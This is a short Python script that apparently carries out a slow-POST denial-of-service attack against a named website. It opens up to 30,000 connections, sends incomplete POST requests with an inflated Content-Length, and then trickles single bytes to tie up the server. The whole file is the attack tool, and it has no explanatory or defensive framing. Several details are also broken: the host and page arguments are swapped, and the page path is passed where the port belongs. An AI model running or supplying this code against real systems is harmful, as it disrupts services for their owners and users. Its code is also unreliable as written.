import socket
import time
import threading

MAX_CONN = 30000

Port = 80
Host = "www.wenyuanzx.cn"
Page = "/Col/Col6/Index.aspx"

buf = ("POST %s HTTP/1.1\r\n"
       "HOST %s\r\n"
       "Content-Length: 10000\r\n"
       "Cookie: dklkt_dos_test\r\n"
       "\r\n" % (Host, Page))
socks = []


def ConnectThread():
    global socks
    while len(socks) < MAX_CONN:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((Host, Page))
            s.send(buf.encode('utf-8'))
            socks.append(s)
        except:
            print('Error1')
            time.sleep(2)


def SendThread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode('utf-8'))
            except:
                print('Error2')
                socks.remove(s)
                s.close()
                time.sleep(2)


if __name__ == "__main__":
    conn_th = threading.Thread(target=ConnectThread, args=())
    send_th = threading.Thread(target=SendThread, args=())

    conn_th.start()
    send_th.start()

    while True:
        print("%d" % len(socks))
        time.sleep(1)
